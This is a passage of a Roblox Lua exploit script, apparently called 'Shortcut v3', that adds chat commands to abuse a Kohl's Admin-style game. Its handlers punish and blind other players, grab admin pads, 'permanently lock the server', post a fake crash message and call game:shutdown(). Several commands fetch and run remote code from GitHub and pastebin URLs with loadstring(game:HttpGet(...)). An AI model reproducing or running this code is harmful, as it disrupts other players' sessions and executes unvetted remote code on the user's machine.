							if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
								colorAPI.color(v, WANDDC) -- Default is "Dark orange"
							end -- House windows and door outlines

							if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
								colorAPI.color(v, stairsC) -- Default is "Dark stone grey"
							end -- House Stairs

							if v.Name == "SmoothBlockModel112" then
								colorAPI.color(v, floorC) -- Default is "Medium blue"
							end -- House floor

							if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
								colorAPI.color(v, rooftsC) -- Default is "Reddish brown"
							end -- House roof thingys

							if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
								colorAPI.color(v, chiC) -- Default is "Sand red"
							end -- Chi top part
						end)()
					end
				end

				colorAPI.colorBuildingBricks = function(arg)
					local DarkStoneGrey = arg.DarkStoneGrey
					local DeepBlue = arg.DeepBlue
					local NY = arg.NY
					local IW = arg.IW
					local LimeGreen = arg.LimeGreen
					local MSG = arg.MSG
					local RB = arg.RB
					local RR = arg.RR
					local TP = arg.TP

					-------------------------------------------------------------------- Building Bricks --------------------------------------------------------------------

					for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
						coroutine.wrap(function()
							if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
								colorAPI.color(v, DarkStoneGrey) -- Default is "Dark stone grey"
							end

							if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
								colorAPI.color(v, DeepBlue) -- Default is "Deep blue"
							end

							if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
								colorAPI.color(v, NY) -- Default is "New Yeller"
							end

							if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
								colorAPI.color(v, IW) -- Default is "Institutional white"
							end

							if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part9" or v.Name == "Part5" then
								colorAPI.color(v, LimeGreen) -- Default is "Lime green"
							end

							if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" then
								colorAPI.color(v, MSG) -- Default is "Medium Stone grey"
							end

							if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
								colorAPI.color(v, RB) -- Default is "Really black"
							end

							if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
								colorAPI.color(v, RR) -- Default is "Really red"
							end

							if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
								colorAPI.color(v, TP) -- Default is "Toothpaste"
							end
						end)()
					end
				end

				chatt("gear me "..antilog.."18474459")
				chatt("invis "..antilog.." me "..math.random(99999))
				task.wait(.65)
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
				task.wait(0.35)
				coroutine.wrap(function()
					colorAPI.colorHouse({
						wallsC = colorAPI.transformToColor3(BrickColor.new("Brick yellow")),
						baseC = colorAPI.transformToColor3(BrickColor.new("Bright green")),
						roofC = colorAPI.transformToColor3(BrickColor.new("Bright red")),
						WANDDC = colorAPI.transformToColor3(BrickColor.new("Dark orange")),
						stairsC = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
						floorC = colorAPI.transformToColor3(BrickColor.new("Medium blue")),
						rooftsC = colorAPI.transformToColor3(BrickColor.new("Reddish brown")),
						chiC = colorAPI.transformToColor3(BrickColor.new("Sand red"))
					})
				end)()
				spawn(function()
					colorAPI.colorBuildingBricks({
						DarkStoneGrey = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
						DeepBlue = colorAPI.transformToColor3(BrickColor.new("Deep blue")),
						NY = colorAPI.transformToColor3(BrickColor.new("New Yeller")),
						IW = colorAPI.transformToColor3(BrickColor.new("Institutional white")),
						LimeGreen = colorAPI.transformToColor3(BrickColor.new("Lime green")),
						MSG = colorAPI.transformToColor3(BrickColor.new("Medium Stone grey")),
						RB = colorAPI.transformToColor3(BrickColor.new("Really black")),
						TP = colorAPI.transformToColor3(BrickColor.new("Toothpaste")),
						RR = colorAPI.transformToColor3(BrickColor.new("Really red"))
					})
				end)
				colorAPI.color(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], colorAPI.transformToColor3(BrickColor.new("Bright green")))
				spawn(function()
					colorAPI.colorObbyBox(colorAPI.transformToColor3(BrickColor.new("Teal")))
				end)
				spawn(function()
					colorAPI.colorObbyBricks(colorAPI.transformToColor3(BrickColor.new("Really red")))
				end)
				spawn(function()
					colorAPI.colorAdminDivs(colorAPI.transformToColor3(BrickColor.new("Dark stone grey")))
				end)
				spawn(function()
					colorAPI.colorPads(colorAPI.transformToColor3(BrickColor.new("Bright green")))
				end)
				task.wait(0.6)
				chatt("ungear "..antilog.." me "..math.random(99999))
				chatt("vis "..antilog.." me "..math.random(99999))
				longlogn("Please keep in mind that this enabled AntiGears v2 just to prevent people from painting")
				--nil
			end
			if msg:lower() == "fix" then
				ccolors = false
			end
			if msg:lower() == prefix .. "finishps" then -- Left untouched since v2
				chatt(prefix.."voidbypass")
				chatt("/unadmin");task.wait()
				chatt(
					"punish "..antilog.." others"
				)
				task.wait()
				chatt(
					"blind "..antilog.." others"
				)
				regen();wait(1.35)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(41999, -159500, -26));wait(2)
				chatt("/beeeeeone");wait(1)
				chatt("fly me");wait()
				chatt("unpunish me,me,me");wait()
				chatt("unfly me")
			end
			if msg:lower() == prefix .. "permaslock" then --game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0
				game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0
				logn(
					"This often requires a rejoin because of lag \n If it fails to move the spawns rejoin then try again."
				)
				wait(1)
				game.Players:Chat("/toggle antivoid")
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(-22222, -466969, -420420))
				game.Players:Chat("/getspawn");wait(10)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(-999999, -486969, -420420))
				game.Players:Chat("/gutspawn");wait(10)
				logn("type //finishps to finish this and to permanently lock the server");wait(9)
				longlogn("type //finishps to finish this and to permanently lock the server");wait(9)
			end
			if msg:lower() == prefix .. "resetspawn" then -- Left untouched since v2
				game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0 ;wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(-41, 4, -26));wait()
				game.Players:Chat(prefix.."setspawn");wait(15)
				game:GetService("Workspace").FallenPartsDestroyHeight = -500
			end
			if msg:lower() == prefix .. "fixantitp" then -- Left untouched since v2
				antiTeleport = false
				pos1 = nil
				pos2 = nil
				chatt("unchar "..antilog.." me")
			end
			if msg:lower() == prefix .. "breakcam" then -- Left untouched since v2
				chatt("/disablerc");wait(2)
				chatt("ungear all")
			end
			if msg:lower() == prefix .. "part" then -- Left untouched since v2
				chatt("invis me")
				chatt("stun me")
				chatt("freeze me")
				chatt("name me invisible core");wait(.3)
				chatt("clone me")
				chatt("outdoorambient 255 255 255");wait()
				chatt("reset me");wait(.7)
				chatt("gear me "..antilog.."0123234673")
				chatt("pm me Hit the block with the Knife");wait(10)
				chatt("gear me "..antilog.."018474459")
			end
			if msg:lower() == prefix .. "idle" then -- Left untouched since v2
				chatt("/trap me");wait(.5)
				chatt("god "..antilog.." me")
				logn("Your moving legs is only client sided")
				chatt("fly me")
				chatt("setgrav me inf")
			end
			if msg:lower() == prefix .. "emoji" then
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/T3chn0w1thth4t/garbage/main/emojis.txt"),
						true
					)
				)()
			end
			if msg:lower() == prefix .. "error" then
				chatt("music 1835352438")
				chatt(
                            [[h  

























_______________________________________




 :(
__________________________

The server has glitched because this script has detected an error.

Server will be back online soon.

_________________________________
Additional information - Shortcut v3 is the best script on the market

]]
				)
				chatt("fogcolor 1000 0 0");wait(1.5)
				chatt(prefix.."tempcrash");wait(3)
				chatt("fix")
				chatt("unchar all");wait(6)
				chatt("clr")
			end
			if msg:lower() == prefix .. "up" then
				antiTeleport = true
				task.wait(.65)
				game.Players.LocalPlayer.Character:Destroy()
				chatt("unchar me,me,me " .. math.random(1, 999999))
				task.wait(10.45)
				antiTeleport = false
				pos1 = nil
				pos2 = nil
			end

			if msg:lower() == prefix .. "loopgrab" then
				padAbuse = true
			end
			if msg:lower() == prefix .. "testgrab" then
				testgrab = true
				logn("untestgrab to undo")
			elseif msg:lower() == prefix .. "untestgrab" then
				testgrab = false
			end

			if msg:lower() == prefix .. "emrgrab" then -- Unlisted
				emrgrab = true
			elseif msg:lower() == prefix .. "unemrgrab" then
				emrgrab = false
			end

			if msg:lower() == prefix .. "killpaintui" then
				somethingsmart = true ;wait(25)
				logn("Insert framedrop. \n It will go over soon don't worry.")
				somethingsmart = false
			end
			if msg:lower() == prefix .. "antistuff" then
				antiBlind = true
				antiSetgrav = true
				antiSpeed = true
				antinoclip()
			end
			if msg:lower() == prefix .. "temploopgrab" then
				temploopgrab = true
			end
			if msg:lower() == prefix .. "testgrab2" then
				chatt(prefix.."infyield")
				chatt("/loopgrab")
				testgrab = true
				perm = true
				wait(1.5)
				chatt("/spam /allpadspiss " .. math.random(1, 1000))
				chatt(prefix.."spam /allpadspiss " .. math.random(1, 1000))
				chatt(prefix.."super /allpadspiss " .. math.random(1, 1000))
				chatt("/permpiss");wait(1.5)
				execCmd("noclip");wait(15)
				chatt("/permpiss")
				chatt(prefix.."temploopgrab")
				logn(prefix.."unsuperloopgrab disables this")
				perm = false ;wait()
				perm = true
				wait(3.55)
				chatt(prefix.."untestgrab")
			end
			if msg:lower() == prefix .. "untestgrab2" then
				chatt("/unloopgrab")
				padAbuse = false
				perm = false ;wait(1.5)
				chatt(prefix.."stop")
				chatt("/nonperm");wait(1.5)
				execCmd("clip");wait(15)
				chatt(prefix.."untemploopgrab")
				logn("Rejoin to get the pads back in place on your client")
				perm = false
			end
			if msg:lower() == prefix .. "unloopgrab" then
				padAbuse = false
				testgrab = false
				temploopgrab = false
				emrgrab = false
			end
			if msg:lower() == prefix .. "untemploopgrab" then
				temploopgrab = false
			end
			if msg:lower() == prefix .. "oldantitp" then
				antiTeleport = true
				logn("Use //fixantitp to turn this off")
			end
			if msg:lower() == prefix .. "tabcheck" then
				tcheck = true
			end
			if msg:lower() == prefix .. "untabcheck" then
				tcheck = false
			end
			if msg:lower() == prefix .. "fixcam" then
				--loadstring(game:HttpGet(("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/RobloxCameraFixScript.lua"),true))()
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/enablerc.txt"),
						true
					)
				)()
			end
			if msg:lower() == prefix .. "executor" then
				loadstring(game:HttpGet(('https://pastebin.com/raw/0sQngbMi'),true))()
				logn("/lua also exists btw")
			end
			if msg:lower() == prefix .. "removeconnections" then -- in docs
				Utils.ejectScript()
			end
			if msg:lower() == prefix .. "noplayerlist" then
				Utils.ejectGUI()
			end
			if msg:lower() == prefix .. "unlockprefixes" then
				unlockprefixes = true
				print("You can disable this with lockprefixes")
			elseif msg:lower() == prefix .. "lockprefixes" then
				unlockprefixes = false
			end
--[[
if msg:lower() == prefix .. "zoomer" then
    pcall(function()
        if not syn then
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4Iw4reT3sts/scr4bl33/main/Part%20of%20the%20temp%20folder'), true))();wait(1.65)
            chatt(prefix.."/repott")
        else
            longlogn("Could not use zoomer due to Synapse blocking it")
        end
    end);wait(6.5)
    rejoin()
end]]
			if msg:lower() == prefix .. "emrfindregen" then
				logn("Also this won't work if you have infinite yield opened up")
				loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
				chatt("fly me");wait(2.5)
				execCmd("fly 1000")
				execCmd("unkeepiy")
				chatt(prefix.."cframelocatereg")
				chatt(prefix.."movedb")
				execCmd("fly 1000")
				execCmd("showguis");wait(5.5)
				chatt(prefix.."up");wait(8.8)
				chatt(prefix.."toregen");wait(11.5)
				chatt(prefix.."loopgrab")
				execCmd("autorj")
				logn("you're currently loopgrabbing")
				logn("If it still couldn't find the regen then rip it's gone");wait(9)
				chatt(prefix.."voidbypass")
				chatt(prefix.."up");wait(3.75)
				--loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/zoomer.lua'),true))();wait(1.65)
				chatt(prefix.."/repott")
				logn("Scanning possible voidcoords")
    --[[loadstring(
        game:HttpGet(("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/teststring2"), true)
    )()]]
				logn("Try to use the Noadmin lagger now or use the Void Searcher if you still don't have the pad")
			end
			if msg:lower() == prefix .. "poweronly" then
				poweronly = true
			end
			if msg:lower() == prefix .. "recyclebin" then
				chatt("fly me")
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
					CFrame.new(Vector3.new(100000, 10000, 100000))
				longlogn("Teleported you to the Delete tool coords")
			end
			if msg:lower() == prefix .. "fixgvel" then
				chatt("/fixbp");wait();chatt("/fixbp");wait();chatt("/fixbp");wait();chatt("/fixbp");wait(1)
				chatt("unskydive me me me");chatt("unskydive me me me")
				chatt("unchar me")
			end
			if msg:lower() == prefix .. "fixcollision" then
				for i, v in pairs(game.Workspace:GetDescendants()) do
					if v:IsA("Part") then
						v.CanCollide = true
					end
				end
			end

			if msg:lower()==prefix.."runc a"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1a)task.wait(.1)chatt(shared.customcmd2a)task.wait(.1)chatt(shared.customcmd3a)task.wait(.1)chatt(shared.customcmd4a)task.wait(.1)chatt(shared.customcmd5a)task.wait(.1)chatt(shared.customcmd6a)task.wait(.1)chatt(prefix.."optionalcustom a")end;if msg:lower()==prefix.."optionalcustom a"then task.wait()task.wait(.1)chatt(shared.customcmd7a)task.wait(.1)chatt(shared.customcmd8a)task.wait(.1)chatt(shared.customcmd9a)task.wait(.1)chatt(shared.customcmd10a)task.wait(.1)chatt(shared.customcmd11a)task.wait(.1)chatt(shared.customcmd12a)if shared.customcmd13a then game:shutdown()end end;if msg:lower()==prefix.."runc b"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1b)task.wait(.1)chatt(shared.customcmd2b)task.wait(.1)chatt(shared.customcmd3b)task.wait(.1)chatt(shared.customcmd4b)task.wait(.1)chatt(shared.customcmd5b)task.wait(.1)chatt(shared.customcmd6b)task.wait(.1)chatt(prefix.."optionalcustom b")end;if msg:lower()==prefix.."optionalcustom b"then task.wait()task.wait(.1)chatt(shared.customcmd7b)task.wait(.1)chatt(shared.customcmd8b)task.wait(.1)chatt(shared.customcmd9b)task.wait(.1)chatt(shared.customcmd10b)task.wait(.1)chatt(shared.customcmd11b)task.wait(.1)chatt(shared.customcmd12b)if shared.customcmd13b then game:shutdown()end end;if msg:lower()==prefix.."runc c"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1c)task.wait(.1)chatt(shared.customcmd2c)task.wait(.1)chatt(shared.customcmd3c)task.wait(.1)chatt(shared.customcmd4c)task.wait(.1)chatt(shared.customcmd5c)task.wait(.1)chatt(shared.customcmd6c)task.wait(.1)chatt(prefix.."optionalcustom c")end;if msg:lower()==prefix.."optionalcustom c"then task.wait()task.wait(.1)chatt(shared.customcmd7c)task.wait(.1)chatt(shared.customcmd8c)task.wait(.1)chatt(shared.customcmd9c)task.wait(.1)chatt(shared.customcmd10c)task.wait(.1)chatt(shared.customcmd11c)task.wait(.1)chatt(shared.customcmd12c)if shared.customcmd13c then game:shutdown()end end;if msg:lower()==prefix.."makecstartup"then task.wait(.1)chatt(shared.startuprunc1)task.wait(.1)chatt(shared.startuprunc2)task.wait(.1)chatt(shared.startuprunc3)task.wait(.1)chatt(shared.startuprunc4)task.wait(.1)chatt(shared.startuprunc5)task.wait(.1)chatt(shared.startuprunc6)if shared.startuprunc7 then game:shutdown()end end;if msg:lower()==prefix.."runc d"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1d)task.wait(.1)chatt(shared.customcmd2d)task.wait(.1)chatt(shared.customcmd3d)task.wait(.1)chatt(shared.customcmd4d)task.wait(.1)chatt(shared.customcmd5d)task.wait(.1)chatt(shared.customcmd6d)task.wait(.1)chatt(shared.customcmd7d)task.wait(.1)chatt(shared.customcmd8d)task.wait(.1)chatt(shared.customcmd9d)task.wait(.1)chatt(shared.customcmd10d)task.wait(.1)chatt(shared.customcmd11d)task.wait(.1)chatt(shared.customcmd12d)if shared.customcmd13d then game:shutdown()end end;if msg:lower()==prefix.."runc e"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1e)task.wait(.1)chatt(shared.customcmd2e)task.wait(.1)chatt(shared.customcmd3e)task.wait(.1)chatt(shared.customcmd4e)task.wait(.1)chatt(shared.customcmd5e)task.wait(.1)chatt(shared.customcmd6e)task.wait(.1)chatt(shared.customcmd7e)task.wait(.1)chatt(shared.customcmd8e)task.wait(.1)chatt(shared.customcmd9e)task.wait(.1)chatt(shared.customcmd10e)task.wait(.1)chatt(shared.customcmd11e)task.wait(.1)chatt(shared.customcmd12e)if shared.customcmd13e then game:shutdown()end end;if msg:lower()==prefix.."runc f"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1f)task.wait(.1)chatt(shared.customcmd2f)task.wait(.1)chatt(shared.customcmd3f)task.wait(.1)chatt(shared.customcmd4f)task.wait(.1)chatt(shared.customcmd5f)task.wait(.1)chatt(shared.customcmd6f)task.wait(.1)chatt(shared.customcmd7f)task.wait(.1)chatt(shared.customcmd8f)task.wait(.1)chatt(shared.customcmd9f)task.wait(.1)chatt(shared.customcmd10f)task.wait(.1)chatt(shared.customcmd11f)task.wait(.1)chatt(shared.customcmd12f)if shared.customcmd13f then game:shutdown()end end;if msg:lower()==prefix.."runc g"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1g)task.wait(.1)chatt(shared.customcmd2g)task.wait(.1)chatt(shared.customcmd3g)task.wait(.1)chatt(shared.customcmd4g)task.wait(.1)chatt(shared.customcmd5g)task.wait(.1)chatt(shared.customcmd6g)task.wait(.1)chatt(shared.customcmd7g)task.wait(.1)chatt(shared.customcmd8g)task.wait(.1)chatt(shared.customcmd9g)task.wait(.1)chatt(shared.customcmd10g)task.wait(.1)chatt(shared.customcmd11g)task.wait(.1)chatt(shared.customcmd12g)if shared.customcmd13g then game:shutdown()end end;if msg:lower()==prefix.."runc h"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1h)task.wait(.1)chatt(shared.customcmd2h)task.wait(.1)chatt(shared.customcmd3h)task.wait(.1)chatt(shared.customcmd4h)task.wait(.1)chatt(shared.customcmd5h)task.wait(.1)chatt(shared.customcmd6h)task.wait(.1)chatt(shared.customcmd7h)task.wait(.1)chatt(shared.customcmd8h)task.wait(.1)chatt(shared.customcmd9h)task.wait(.1)chatt(shared.customcmd10h)task.wait(.1)chatt(shared.customcmd11h)task.wait(.1)chatt(shared.customcmd12h)if shared.customcmd13h then game:shutdown()end end;if msg:lower()==prefix.."runc i"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1i)task.wait(.1)chatt(shared.customcmd2i)task.wait(.1)chatt(shared.customcmd3i)task.wait(.1)chatt(shared.customcmd4i)task.wait(.1)chatt(shared.customcmd5i)task.wait(.1)chatt(shared.customcmd6i)task.wait(.1)chatt(shared.customcmd7i)task.wait(.1)chatt(shared.customcmd8i)task.wait(.1)chatt(shared.customcmd9i)task.wait(.1)chatt(shared.customcmd10i)task.wait(.1)chatt(shared.customcmd11i)task.wait(.1)chatt(shared.customcmd12i)if shared.customcmd13i then game:shutdown()end end;if msg:lower()==prefix.."runc j"then task.wait(1.65)task.wait(.1)chatt(shared.customcmd1j)task.wait(.1)chatt(shared.customcmd2j)task.wait(.1)chatt(shared.customcmd3j)task.wait(.1)chatt(shared.customcmd4j)task.wait(.1)chatt(shared.customcmd5j)task.wait(.1)chatt(shared.customcmd6j)task.wait(.1)chatt(shared.customcmd7j)task.wait(.1)chatt(shared.customcmd8j)task.wait(.1)chatt(shared.customcmd9j)task.wait(.1)chatt(shared.customcmd10j)task.wait(.1)chatt(shared.customcmd11j)task.wait(.1)chatt(shared.customcmd12j)if shared.customcmd13j then game:shutdown()end end

--[[if msg:lower() == prefix .. "guicommands" then
    rconsoleprint("If the GUI button is there but the command isn't then that means that there was already a command for it.")
    rconsoleprint("The prefix is still // for those commands. They're just seperated \n Also the * symbol doesn't count though.")
    rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n")
    rconsoleprint("@@LIGHT_RED@@")
    rconsoleprint("\nguiinput commands")
    rconsoleprint("\nguiinput rainbowex")
    rconsoleprint("\nguiinput clickexplode")
    rconsoleprint("\nguiinput clickpadban")
    rconsoleprint("\nguiinput clickfard")
    rconsoleprint("\nguiinput clickannoy")
    rconsoleprint("\nguiinput hideregenpad")
    rconsoleprint("\nguiinput deleteregenpad")
    rconsoleprint("\nguiinput rainbowpads")
    rconsoleprint("\nguiinput deleteadminpads")
    rconsoleprint("\nguiinput noadmin lagger fe")
    rconsoleprint("\nguiinput silent commands")
    rconsoleprint("\nguiinput builds")
    rconsoleprint("\nguiinput f3x instead of btools")
    rconsoleprint("\nguiinput antigears")
    rconsoleprint("\nguiinput antilag")
    rconsoleprint("\nguiinput findregen2")
    rconsoleprint("\nguiinput loadpads")
    rconsoleprint("\nguiinput findregen3")
    rconsoleprint("\nguiinput antispeed")
    rconsoleprint("\nguiinput perm")
    rconsoleprint("\nguiinput guns")
    rconsoleprint("\nguiinput executor specs")
    rconsoleprint("\nguiinput antipunish")
    rconsoleprint("\nguiinput autoheal")
    rconsoleprint("\nguiinput antiblind")
    rconsoleprint("\nguiinput antisetgrav")
    rconsoleprint("\nguiinput antiattach")
    rconsoleprint("\nguiinput antiteleport")
    rconsoleprint("-\n")
    rconsoleprint("@@LIGHT_GRAY@@")
    rconsoleprint("Scroll all the way to the top for information")
end]]
			if msg:lower() == prefix .. "clearbuildfile" then
				writefile("savedthings.lua", '')
			end
			if msg:lower() == prefix .. "fixmap" then
				writefile("savedthings.lua", [[SmoothBlockModel112/-30.0650005, 4.63000011, 99.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
Regen/-7.16500044, 5.42999268, 91.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
Right Wall/-59.0650101, 16.5000038, 33.243, 0, 0, 1, 0, 1, 0, -1, 0, 0
Left Wall/-23.0650024, 16.5000019, 33.243, 0, 0, 1, 0, 1, 0, -1, 0, 0
Back Wall/-23.0650005, 16.5000076, -30.757, -1, 0, 0, 0, 1, 0, 0, 0, -1
Jump7/-41.0650024, 1.37, 24.4430008, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump6/-41.0650024, 1.37, 19.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part31/-77.076004, 2.75, 5.47400045, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel40/-63.0650024, 1.03000009, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part7/-72, 8.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part6/-72, 7.30000019, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part5/-72, 6.0999999, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part4/-72, 4.9000001, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part3/-72, 3.75, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part2/-72, 2.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part1/-72, 1.37, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part29/-78.076004, 0.936, 7.47400045, -1, 0, 0, 0, 1, 0, 0, 0, -1
SmoothBlockModel79/-37.0650024, 33.4300003, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel74/-39.0650024, 32.2300034, 41.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel77/-39.0650024, 32.2300034, 47.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel111/-37.0650024, 33.4300003, 53.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel140/-13.0650005, 37.0300026, 55.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel180/-33.0650024, 35.8300018, 77.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
SmoothBlockModel156/-35.0650024, 34.6300011, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump1/-41.0650024, 1.37, -1.75699973, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump4/-41.0650024, 1.37, 14.0430012, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump8/-41.0650024, 1.37, 29.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump3/-41.0650024, 1.37, 9.04300022, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump2/-41.0650024, 1.37, -13.9570007, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump/-41.0650024, 1.37, -7.95699978, 0, 0, -1, 0, 1, 0, 1, 0, 0
Jump9/-41.0650024, 1.37, -19.757, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part55/-103.076004, 1.75, 17.4740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part57/-101.076004, 1.20200002, 11.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part56/-103.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part60/-103.076004, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part61/-100.077003, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part54/-100.076004, 0.936, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part47/-96.076004, 1.25, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part46/-93.576004, 1.25, 16.4740009, 0, 0, 1, 0, 1, 0, -1, 0, 0
Part59/-98.076004, 1.20200002, 11.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part58/-100.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part52/-95.076004, 1.20200002, 8.47600079, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part53/-97.0770035, 0.90200007, 7.47400045, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part51/-94.0770035, 0.936, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part48/-92.0770035, 1.20200002, 8.47600079, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part36/-89.0770035, 1.20200002, 8.47400093, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part42/-91.0780029, 0.936, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1
Part41/-89.576004, 0.936, 11.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0
Part50/-89.576004, 1.25, 20.4740009, 0, 0, 1, 0, 1, 0, -1, 0, 0
